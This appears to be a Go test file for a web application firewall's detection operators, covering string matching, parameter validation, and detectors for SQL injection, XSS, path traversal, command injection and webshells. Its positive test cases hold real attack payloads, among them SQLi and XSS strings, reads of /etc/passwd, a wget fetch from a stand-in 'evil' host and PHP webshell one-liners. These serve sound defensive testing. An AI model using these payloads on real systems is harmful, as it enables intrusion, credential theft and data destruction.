package operator

import (
	"strings"
	"testing"

	"donothack/internal/kv"
)

// mustCompile 编译算子，失败即测试失败。
func mustCompile(t *testing.T, name string, params map[string]any) Compiled {
	t.Helper()
	op, err := Compile(name, kv.Params(params))
	if err != nil {
		t.Fatalf("编译算子 %s 失败：%v", name, err)
	}
	return op
}

func eval(t *testing.T, op Compiled, in string) Result {
	t.Helper()
	r, err := op.Eval(&EvalCtx{RuleID: "TEST-1"}, []byte(in))
	if err != nil {
		t.Fatalf("求值失败：%v", err)
	}
	return r
}

func TestStringOperators(t *testing.T) {
	cases := []struct {
		name   string
		params map[string]any
		in     string
		want   bool
	}{
		{"eq", map[string]any{"value": "abc"}, "abc", true},
		{"eq", map[string]any{"value": "abc"}, "ABC", false},
		{"eqIgnoreCase", map[string]any{"value": "abc"}, "ABC", true},
		{"contains", map[string]any{"value": "select"}, "1 union select 2", true},
		{"contains", map[string]any{"value": "select"}, "1 union insert 2", false},
		{"containsAny", map[string]any{"values": []any{"a", "b"}}, "xyz b", true},
		{"startsWith", map[string]any{"value": "/admin"}, "/admin/x", true},
		{"endsWith", map[string]any{"value": ".php"}, "/x/shell.php", true},
		{"regex", map[string]any{"pattern": `union\s+select`}, "1 UNION select 2", false}, // 大小写敏感
		{"regex", map[string]any{"pattern": `(?i)union\s+select`}, "1 UNION select 2", true},
		{"pm", map[string]any{"patterns": []any{"union", "select"}}, "uNiOn", false}, // pm 大小写敏感
		{"pm", map[string]any{"patterns": []any{"union", "select"}}, "a union b", true},
		{"pm", map[string]any{"patterns": []any{"union", "select"}, "match_all": true}, "union only", false},
		{"pm", map[string]any{"patterns": []any{"union", "select"}, "match_all": true}, "union and select", true},
	}
	for _, c := range cases {
		t.Run(c.name+"/"+c.in, func(t *testing.T) {
			if got := eval(t, mustCompile(t, c.name, c.params), c.in).Matched; got != c.want {
				t.Errorf("matched = %v，期望 %v", got, c.want)
			}
		})
	}
}

func TestNumericAndByteRange(t *testing.T) {
	if !eval(t, mustCompile(t, "gt", map[string]any{"value": 10}), "42").Matched {
		t.Error("42 > 10 应当命中")
	}
	if eval(t, mustCompile(t, "gt", map[string]any{"value": 10}), "abc").Matched {
		t.Error("非数字不该命中数值比较")
	}
	if !eval(t, mustCompile(t, "within", map[string]any{"min": 1, "max": 5}), "3").Matched {
		t.Error("3 落在 [1,5] 内")
	}
	if !eval(t, mustCompile(t, "validateByteRange", map[string]any{"range": "1-255"}), "a\x00b").Matched {
		t.Error("含 NUL 应当被 validateByteRange 判为越界")
	}
	if eval(t, mustCompile(t, "validateByteRange", map[string]any{"range": "9,10,13,32-126"}), "hello world\n").Matched {
		t.Error("可打印字符 + 换行不该越界")
	}
}

func TestIPMatch(t *testing.T) {
	op := mustCompile(t, "ipMatch", map[string]any{"cidrs": []any{"10.0.0.0/8", "192.168.1.1", "2001:db8::/32"}})
	if !eval(t, op, "10.1.2.3").Matched {
		t.Error("10.1.2.3 应在 10.0.0.0/8 内")
	}
	if !eval(t, op, "192.168.1.1").Matched {
		t.Error("单个 IP 形式也应支持")
	}
	if eval(t, op, "8.8.8.8").Matched {
		t.Error("8.8.8.8 不该命中")
	}
}

func TestLogicalOperators(t *testing.T) {
	all := mustCompile(t, "allOf", map[string]any{"operators": []any{
		map[string]any{"name": "contains", "params": map[string]any{"value": "union"}},
		map[string]any{"name": "contains", "params": map[string]any{"value": "select"}},
	}})
	if !eval(t, all, "union select").Matched {
		t.Error("allOf 两个都满足应命中")
	}
	if eval(t, all, "union only").Matched {
		t.Error("allOf 只满足一个不该命中")
	}

	anyOp := mustCompile(t, "anyOf", map[string]any{"operators": []any{
		map[string]any{"name": "contains", "params": map[string]any{"value": "union"}},
		map[string]any{"name": "contains", "params": map[string]any{"value": "select"}},
	}})
	if !eval(t, anyOp, "select only").Matched {
		t.Error("anyOf 任一满足应命中")
	}

	not := mustCompile(t, "not", map[string]any{"operator": map[string]any{
		"name": "contains", "params": map[string]any{"value": "union"},
	}})
	if !eval(t, not, "select only").Matched {
		t.Error("not 取反应当命中")
	}
}

// 组合深度必须封顶，否则规则集会被"套娃"拖死。
func TestCombineDepthLimited(t *testing.T) {
	nested := map[string]any{"name": "contains", "params": map[string]any{"value": "x"}}
	for i := 0; i < maxCombineDepth+2; i++ {
		nested = map[string]any{"name": "anyOf", "operators": []any{nested}}
	}
	if _, err := Compile("anyOf", kv.Params{"operators": []any{nested}}); err == nil {
		t.Error("超过嵌套层数上限应当报错")
	}
}

// 参数写错必须在**编译期**报错，而不是等流量打上来。
func TestCompileTimeParamValidation(t *testing.T) {
	bad := []struct {
		name   string
		params map[string]any
	}{
		{"regex", map[string]any{}},                               // 缺 pattern
		{"regex", map[string]any{"pattern": "(?<=x)y"}},           // RE2 不支持的环视
		{"contains", map[string]any{}},                            // 缺 value
		{"contains", map[string]any{"value": ""}},                 // 空串会命中所有
		{"pm", map[string]any{"patterns": []any{}}},               // 空列表
		{"pm", map[string]any{"patterns": []any{"a", ""}}},        // 空模式
		{"gt", map[string]any{}},                                  // 缺 value
		{"within", map[string]any{"min": 5, "max": 1}},            // 上下界颠倒
		{"validateByteRange", map[string]any{"range": "300-400"}}, // 字节越界
		{"allOf", map[string]any{}},                               // 缺 operators
		{"allOf", map[string]any{"operators": []any{}}},           // 空组合
		{"ipMatch", map[string]any{"cidrs": []any{"not-an-ip"}}},  // 非法 CIDR
		{"entropy", map[string]any{"min_bits": 9.0}},              // 熵不可能超过 8
		{"不存在的算子", map[string]any{}},
	}
	for _, c := range bad {
		if _, err := Compile(c.name, kv.Params(c.params)); err == nil {
			t.Errorf("算子 %s 的参数 %v 应当被拒绝", c.name, c.params)
		}
	}
}

func TestSuggestionOnTypo(t *testing.T) {
	if s := Suggestion("contians"); s != "contains" {
		t.Errorf("拼错时应当建议 contains，得到 %q", s)
	}
	if _, err := Compile("contians", nil); err == nil || !strings.Contains(err.Error(), "contains") {
		t.Errorf("报错信息里应给出候选，得到 %v", err)
	}
}

// ---------------------------------------------------------------- 语义算子

func TestDetectSQLi(t *testing.T) {
	op := mustCompile(t, "detectSQLi", nil)

	positives := []string{
		"1' UNION SELECT 1,2,3--",
		"admin' union/**/select password from users",
		"1' or '1'='1",
		"1 or 1=1--",
		"' or 1=1#",
		"1'; DROP TABLE users--",
		"1 AND SLEEP(5)",
		"1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
		"1 UNION SELECT table_name FROM information_schema.tables",
		"1' AND 1=1 AND 'x'='x",
		"-1' UNION ALL SELECT NULL,NULL--",
	}
	for _, p := range positives {
		if !eval(t, op, p).Matched {
			t.Errorf("SQLi 应当命中：%q（指纹=%q）", p, sqliFingerprint([]byte(p), 8))
		}
	}

	negatives := []string{
		"it's a good day",                   // 正常英文里的单引号
		"select your country from the list", // 正常业务文案
		"union square station",              // 含 union 的地名
		"O'Brien",                           // 人名
		"1=1",                               // 太短，且无引号上下文
		"the value is 5 and 7",              // 普通文本
		"UPDATE: your order has shipped",    // 正常状态文案
		"cat's cradle",                      // 含单引号
		"2024-01-01 12:00:00",               // 时间戳
		"price: $1 = 100 cents",             // 普通等式
	}
	for _, n := range negatives {
		if r := eval(t, op, n); r.Matched {
			t.Errorf("SQLi 误报：%q（指纹=%s）", n, r.Detail)
		}
	}
}

func TestDetectXSS(t *testing.T) {
	op := mustCompile(t, "detectXSS", nil)

	positives := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"javascript:alert(document.cookie)",
		"<iframe src=javascript:alert(1)>",
		"<body onload=alert(1)>",
		"<details ontoggle=alert(1)>",
		"expression(alert(1))",
		`<a href="vbscript:msgbox(1)">x</a>`,
	}
	for _, p := range positives {
		if !eval(t, op, p).Matched {
			t.Errorf("XSS 应当命中：%q", p)
		}
	}

	negatives := []string{
		"onerror=alert(1)",                     // 没有标签上下文（正是我们自己的规则文本）
		"3 < 5 and onerror = 0 errors",         // '<' 后面不是标签名
		"a < b",                                // 普通比较
		"i love c++ and c#",                    // 普通文本
		"my phone number is 1234",              // 含 "phone"
		"javascript is a programming language", // 提到 javascript 但不是伪协议
		"<div class=x>hello</div>",             // 正常标签无事件处理器
	}
	for _, n := range negatives {
		if r := eval(t, op, n); r.Matched {
			t.Errorf("XSS 误报：%q（%s）", n, r.Detail)
		}
	}
}

func TestDetectPathTraversal(t *testing.T) {
	op := mustCompile(t, "detectPathTraversal", nil)
	for _, p := range []string{
		"../../etc/passwd",
		"..\\..\\windows\\win.ini",
		"/etc/passwd",
		"php://filter/convert.base64-encode/resource=index.php",
		"file:///etc/shadow",
	} {
		if !eval(t, op, p).Matched {
			t.Errorf("路径穿越应当命中：%q", p)
		}
	}
	for _, n := range []string{
		"1.2.3/4", // 版本号
		"a..b/c",  // 两个点但不是穿越
		"/static/img/logo.png",
	} {
		if r := eval(t, op, n); r.Matched {
			t.Errorf("路径穿越误报：%q（%s）", n, r.Detail)
		}
	}
}

func TestContainsShellChars(t *testing.T) {
	op := mustCompile(t, "containsShellChars", nil)
	for _, p := range []string{
		"; id",
		"| whoami",
		"&& cat /etc/passwd",
		"$(cat /etc/passwd)",
		"`id`",
		"1; wget http://evil/x.sh",
	} {
		if !eval(t, op, p).Matched {
			t.Errorf("命令注入应当命中：%q", p)
		}
	}
	for _, n := range []string{
		"a; b",       // 分号但后面不是命令
		"cost is $5", // 美元符号但不是 $(
		"he said: |", // 竖线但不是命令分隔
		"it costs 50 dollars",
	} {
		if r := eval(t, op, n); r.Matched {
			t.Errorf("命令注入误报：%q（%s）", n, r.Detail)
		}
	}
}

func TestIsWebshellContent(t *testing.T) {
	op := mustCompile(t, "isWebshellContent", nil)
	if !eval(t, op, `<?php eval($_POST['cmd']); ?>`).Matched {
		t.Error("eval + 用户输入 应当判为 webshell")
	}
	if !eval(t, op, `system($_GET['c'])`).Matched {
		t.Error("system + 用户输入 应当判为 webshell")
	}
	if !eval(t, op, `<jsp:include page="x"/>`).Matched {
		t.Error("JSP 标签应当判为 webshell")
	}
	// 只有函数名没有用户输入源：不单独立案（降误报）
	if eval(t, op, "we call eval( once").Matched {
		t.Error("没有用户输入源时不该单独判为 webshell")
	}
}

func TestEntropy(t *testing.T) {
	op := mustCompile(t, "entropy", map[string]any{"min_bits": 4.0, "min_len": 20})
	if !eval(t, op, "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgc3RyaW5n").Matched {
		t.Error("长随机串应当命中高熵")
	}
	if eval(t, op, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa").Matched {
		t.Error("重复字符熵为 0，不该命中")
	}
	if eval(t, op, "short").Matched {
		t.Error("短于 min_len 不该命中")
	}
}

func TestLuhn(t *testing.T) {
	op := mustCompile(t, "luhn", nil)
	if !eval(t, op, "4111 1111 1111 1111").Matched {
		t.Error("合法测试卡号应当命中 Luhn")
	}
	if eval(t, op, "1234 5678 9012 3456").Matched {
		t.Error("不满足 Luhn 的数字串不该命中")
	}
	if eval(t, op, "12345").Matched {
		t.Error("位数不足不该命中")
	}
}
